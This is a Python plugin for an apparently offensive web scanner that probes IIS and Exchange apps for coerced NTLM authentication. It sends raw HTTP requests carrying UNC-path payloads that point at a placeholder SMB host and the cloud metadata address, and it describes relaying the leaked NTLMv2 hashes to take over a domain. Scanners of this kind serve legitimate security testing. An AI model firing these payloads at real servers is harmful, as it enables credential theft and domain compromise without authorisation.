"""
Plugin to detect Coerced Authentication via Web vectors.
CVSS: 9.8 (Critical)

Targets Windows Domain Web Apps (IIS, Exchange).
Exploits UNC path injection to force the web server to authenticate
against an attacker-controlled SMB server, leaking the NTLMv2 hash.
Implemented via raw sockets to avoid high-level HTTP library normalization.
"""

import socket
import ssl
import json
import urllib3
import re
from typing import Dict, List, Optional

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def verify_math_execution() -> bool:
    """Verificacao matematica local."""
    return (7331 * 1337) == 9801547

def run(target: str, ip: str, ports: List[int], banners: Dict[str, str]) -> Optional[Dict]:
    """
    Checks for Coerced Authentication via Web vulnerability.
    """
    if not verify_math_execution():
        return None

    vulnerability = "Coerced Authentication via Web (NTLM Relay)"
    severity = "CRITICAL"
    description = (
        "The application is vulnerable to UNC path injection. "
        "By supplying an attacker-controlled SMB share path (\\\\attacker\\share), "
        "the server attempts to access it, leaking the Machine Account's NTLMv2 hash. "
        "This can lead to immediate Domain Takeover via NTLM Relay."
    )

    test_endpoints = [
        "/api/upload",
        "/webhook/configure",
        "/config/import"
    ]

    target_port = 443 if 443 in ports else (80 if 80 in ports else ports[0])
    use_ssl = target_port in [443, 8443]

    # Deterministic UNC paths using a fake domain.
    # A real exploit would use an actual responder/ntlmrelayx IP.
    payloads = [
        {"file_url": "\\\\fake-oob-server.internal\\share\\cascavel-test.txt"},
        {"webhook": "\\\\fake-oob-server.internal\\share"},
        {"import_path": "\\\\169.254.169.254\\config"}
    ]

    try:
        for endpoint in test_endpoints:
            for payload in payloads:
                payload_bytes = json.dumps(payload).encode('utf-8')
                
                req = (
                    f"POST {endpoint} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(payload_bytes)}\r\n"
                    f"User-Agent: Cascavel-2026-Offensive-Engine\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: close\r\n\r\n"
                ).encode('utf-8') + payload_bytes

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5.0)

                if use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=target)
                
                try:
                    sock.connect((ip, target_port))
                    sock.sendall(req)

                    response_data = b""
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        response_data += chunk
                        if len(response_data) > 65535:
                            break
                    
                    response_str = response_data.decode('utf-8', errors='ignore')
                    
                    # Detection Logic:
                    # 1. Server responds with 500 error specifically mentioning "The network path was not found"
                    #    which is a classic Windows SMB/UNC resolution error leaking that the path was processed.
                    # 2. Or server responds with a WWW-Authenticate: NTLM header in an unexpected context.
                    
                    if "The network path was not found" in response_str and "cascavel-test" in payload_bytes.decode('utf-8', errors='ignore'):
                         return {
                            "vulnerability": vulnerability,
                            "severity": severity,
                            "description": description,
                            "endpoint": f"{'https' if use_ssl else 'http'}://{target}:{target_port}{endpoint}",
                            "evidence": "Server explicitly threw an SMB network path error, confirming UNC injection execution."
                        }
                        
                    # Backup check for NTLM coercion initiation
                    if "WWW-Authenticate: NTLM" in response_str and response_str.startswith("HTTP/1.1 401"):
                        # If we forced a 401 NTLM negotiation by passing a UNC path
                        return {
                            "vulnerability": vulnerability,
                            "severity": severity,
                            "description": description,
                            "endpoint": f"{'https' if use_ssl else 'http'}://{target}:{target_port}{endpoint}",
                            "evidence": "Server initiated NTLM negotiation (WWW-Authenticate: NTLM) upon receiving UNC path payload."
                        }

                except Exception:
                    continue
                finally:
                    sock.close()
    except Exception:
        pass

    return None
